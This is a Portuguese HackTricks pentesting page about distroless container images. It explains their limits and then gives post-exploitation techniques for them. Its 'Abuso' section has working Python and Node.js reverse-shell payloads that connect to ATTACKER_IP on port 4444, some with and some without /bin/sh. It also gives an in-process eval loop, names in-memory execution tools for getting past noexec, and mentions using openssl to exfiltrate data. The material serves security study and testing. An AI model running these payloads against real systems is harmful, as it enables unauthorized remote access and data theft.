# Containers Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Uma imagem de container **distroless** inclui os **componentes mínimos de runtime necessários para executar uma aplicação específica**, removendo intencionalmente as ferramentas habituais de distribuição, como gerenciadores de pacotes, shells e grandes conjuntos de utilitários genéricos de userland. Na prática, imagens distroless geralmente contêm apenas o binário ou runtime da aplicação, suas bibliotecas compartilhadas, bundles de certificados e um layout de filesystem muito pequeno. <sup>[[1]](#references)</sup>

A ideia não é que distroless seja uma nova primitiva de isolamento do kernel. Distroless é uma **estratégia de design de imagem**. Ela altera o que está disponível **dentro** do filesystem do container, não a forma como o kernel isola o container. Essa distinção importa, pois distroless fortalece o ambiente principalmente reduzindo o que um atacante pode usar após obter execução de código. Não substitui namespaces, seccomp, capabilities, AppArmor, SELinux nem qualquer outro mecanismo de isolamento em runtime.

## Por que Distroless Existe

Imagens distroless são usadas principalmente para reduzir:

- o tamanho da imagem
- a complexidade operacional da imagem
- o número de pacotes e binários que podem conter vulnerabilidades
- o número de ferramentas de post-exploitation disponíveis por padrão para um atacante

Por isso, imagens distroless são populares em implantações de aplicações em produção. Um container sem shell, gerenciador de pacotes e quase nenhuma ferramenta genérica costuma ser mais fácil de administrar e mais difícil de abusar interativamente após um comprometimento.

Exemplos de famílias conhecidas de imagens no estilo distroless incluem:

- Imagens distroless do Google <sup>[[1]](#references)</sup>
- Imagens hardened/minimal da Chainguard <sup>[[2]](#references)</sup>

## O que Distroless Não Significa

Um container distroless **não é**:

- automaticamente rootless
- automaticamente sem privilégios
- automaticamente somente leitura
- automaticamente protegido por seccomp, AppArmor ou SELinux
- automaticamente seguro contra escape de container

Ainda é possível executar uma imagem distroless com `--privileged`, compartilhamento de namespaces do host, bind mounts perigosos ou um socket de runtime montado. Nesse cenário, a imagem pode ser mínima, mas o container ainda pode ser catastróficamente inseguro. Distroless altera a **superfície de ataque do userland**, não a **fronteira de confiança do kernel**.

## Características Operacionais Típicas

Quando você compromete um container distroless, a primeira coisa que geralmente percebe é que as suposições comuns deixam de valer. Pode não haver `sh`, `bash`, `ls`, `id`, `cat` e, às vezes, nem mesmo um ambiente baseado em libc que se comporte como o seu tradecraft habitual espera. Isso afeta tanto o ataque quanto a defesa, pois a falta de ferramentas muda a depuração, a resposta a incidentes e a post-exploitation.

Os padrões mais comuns são:

- o runtime da aplicação existe, mas quase nada além dele
- payloads baseados em shell falham porque não há shell
- comandos curtos comuns de enumeração falham porque faltam os binários auxiliares
- proteções do filesystem, como rootfs somente leitura ou `noexec` em locais tmpfs graváveis, também costumam estar presentes

Essa combinação é o que geralmente leva as pessoas a falar em "weaponizing distroless".

## Distroless e Post-Exploitation

O principal desafio ofensivo em um ambiente distroless nem sempre é o RCE inicial. Muitas vezes, é o que vem depois. Se a workload explorada oferece execução de código em um runtime de linguagem como Python, Node.js, Java ou Go, talvez seja possível executar lógica arbitrária, mas não pelos fluxos de trabalho normais centrados em shell que são comuns em outros alvos Linux.

Isso significa que a post-exploitation costuma seguir uma de três direções:

1. **Usar diretamente o runtime de linguagem existente** para enumerar o ambiente, abrir sockets, ler arquivos ou preparar payloads adicionais.
2. **Carregar suas próprias ferramentas na memória** se o filesystem for somente leitura ou se os locais graváveis estiverem montados com `noexec`.
3. **Abusar de binários existentes na imagem** se a aplicação ou suas dependências incluírem algo inesperadamente útil.

## Abuso

### Enumerar o Runtime que Você Já Tem

Em muitos containers distroless não há shell, mas ainda existe um runtime de aplicação. Se o alvo for um serviço Python, Python estará disponível. Se o alvo for Node.js, Node estará disponível. Isso costuma oferecer funcionalidade suficiente para enumerar arquivos, ler variáveis de ambiente, abrir reverse shells e preparar execução em memória sem nunca invocar `/bin/sh`.

Um exemplo simples com Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Um exemplo simples com Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Impacto:

- recuperação de variáveis de ambiente, geralmente incluindo credenciais ou endpoints de serviços
- enumeração do sistema de arquivos sem `/bin/ls`
- identificação de caminhos graváveis e secrets montados

### Runtime interativo sem `/bin/sh`

Se a imagem não contiver `sh` ou `bash`, uma reverse shell clássica baseada em shell falhará. Nessa situação, exponha uma sessão interativa no runtime da linguagem instalado em vez de iniciar um shell inexistente.

Por exemplo, este payload Python redireciona um console Python interativo por meio de um socket:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

A abordagem equivalente em Node.js pode avaliar JavaScript recebido por um socket. É um REPL de JavaScript, não um shell do sistema operacional; as operações de sistema de arquivos, processos e rede devem ser realizadas por meio das APIs do Node:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Ambos os exemplos exigem conectividade de saída e um interpretador disponível, e ambos oferecem apenas as funcionalidades expostas por esse interpretador.

Se a imagem incluir inesperadamente `/bin/sh`, os payloads clássicos de shell assistidos por interpretador continuam sendo úteis. Eles são apresentados separadamente porque não são realmente livres de shell:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

O padrão mais antigo de loop de comandos em Python também é útil quando `/bin/sh` existe, mas um PTY interativo é inconveniente. Ele é mantido aqui com sua dependência real explicitada: `subprocess.run(..., shell=True)` invoca o shell do sistema e, portanto, **não** é uma técnica sem shell.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Exemplo completo: loop de comandos Python sem shell

Se a imagem tiver Python, mas nenhum shell, um REPL local do Python ainda poderá permitir a inspeção do sistema de arquivos, do ambiente e da rede:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Esse loop não invoca `/bin/sh`. Ele avalia expressões e instruções Python diretamente, então as operações precisam usar APIs Python em vez de comandos shell. Dentro dessa limitação, ainda pode oferecer boa parte do impacto de um shell básico: enumeração do sistema de arquivos e do ambiente, acesso a dados, atividade de rede e preparação de payloads adicionais por meio do runtime instalado.

### Execução de ferramentas em memória

Imagens Distroless costumam ser combinadas com:

- `readOnlyRootFilesystem: true`
- tmpfs gravável, mas com `noexec`, como `/dev/shm`
- ausência de ferramentas de gerenciamento de pacotes

Essa combinação torna pouco confiáveis os fluxos de trabalho clássicos de “baixar um binário para o disco e executá-lo”. Nesses casos, técnicas de execução em memória tornam-se a principal solução.

A página dedicada a isso é:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

As técnicas mais relevantes são:

- `memfd_create` + `execve` por meio de runtimes de scripting <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Em um serviço Python, Node.js ou PHP, o ponto de entrada pode ser um bug na aplicação, como template injection, prototype pollution ou avaliação insegura. Se isso permitir execução de código dentro do processo, uma técnica com `/proc/self/mem` pode executar um loader sem shell ou arquivo executável no disco. A execução continua usando a identidade do processo do container; para escapar do container, é necessária uma vulnerabilidade separada no runtime ou na fronteira do host. Consulte as [técnicas para read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) para conhecer os pré-requisitos.

### Binários já existentes na imagem

Algumas imagens Distroless ainda contêm binários necessários para operações que se tornam úteis após um comprometimento. Um exemplo observado com frequência é `openssl`, pois às vezes as aplicações precisam dele para tarefas relacionadas a criptografia ou TLS.

Um padrão de busca rápida é:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Se `openssl` estiver presente, ele pode ser usado para:

- conexões TLS de saída
- exfiltração de dados por um canal de saída permitido
- preparação de dados de payload por meio de blobs codificados/criptografados

O abuso exato depende do que está realmente instalado, mas a ideia geral é que distroless não significa "absolutamente nenhuma ferramenta"; significa "muito menos ferramentas do que uma imagem de distribuição normal".

## Verificações

O objetivo destas verificações é determinar se a imagem é realmente distroless na prática e quais binários de runtime ou auxiliares ainda estão disponíveis para post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

O que é interessante aqui:

- Se não houver um shell, mas houver um runtime como Python ou Node, o post-exploitation deve migrar para a execução por meio do runtime.
- Se o sistema de arquivos raiz for somente leitura e `/dev/shm` puder ser gravado, mas tiver `noexec`, técnicas de execução em memória se tornam muito mais relevantes.
- Se houver binários auxiliares como `openssl`, `busybox` ou `java`, eles podem oferecer funcionalidades suficientes para estabelecer acesso adicional.

## Padrões do runtime

| Estilo de imagem / plataforma | Estado padrão | Comportamento típico | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Imagens no estilo distroless do Google | Espaço de usuário mínimo por projeto | Sem shell, sem gerenciador de pacotes, apenas dependências da aplicação/runtime | adicionar camadas de depuração, shells sidecar, copiar busybox ou ferramentas |
| Imagens mínimas da Chainguard | Espaço de usuário mínimo por projeto | Superfície de pacotes reduzida, geralmente focada em um runtime ou serviço | usar variantes `:latest-dev` ou de depuração, copiar ferramentas durante o build |
| Workloads do Kubernetes que usam imagens distroless | Depende da configuração do Pod | Distroless afeta apenas o espaço de usuário; a postura de segurança do Pod ainda depende da especificação do Pod e dos padrões do runtime | adicionar contêineres de depuração efêmeros, montagens do host, configurações de Pod privilegiado |
| Docker / Podman executando imagens distroless | Depende das flags de execução | Sistema de arquivos mínimo, mas a segurança do runtime ainda depende das flags e da configuração do daemon | `--privileged`, compartilhamento de namespace do host, montagens do socket do runtime, bind mounts graváveis do host |

O ponto principal é que distroless é uma **propriedade da imagem**, não uma proteção do runtime. Seu valor vem da redução do que fica disponível no sistema de arquivos após o comprometimento. Builds em vários estágios são uma forma comum de manter as ferramentas de build fora da imagem final. <sup>[[3]](#references)</sup>

## Páginas relacionadas

Para contornar proteções do sistema de arquivos e de execução em memória, algo frequentemente necessário em ambientes distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para abusos do runtime de contêiner, de sockets e de montagens que também se aplicam a workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Imagens de contêiner distroless](https://github.com/GoogleContainerTools/distroless)
- [2] [Documentação do Chainguard Images](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docs do Docker - Builds em vários estágios](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Página do manual do Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
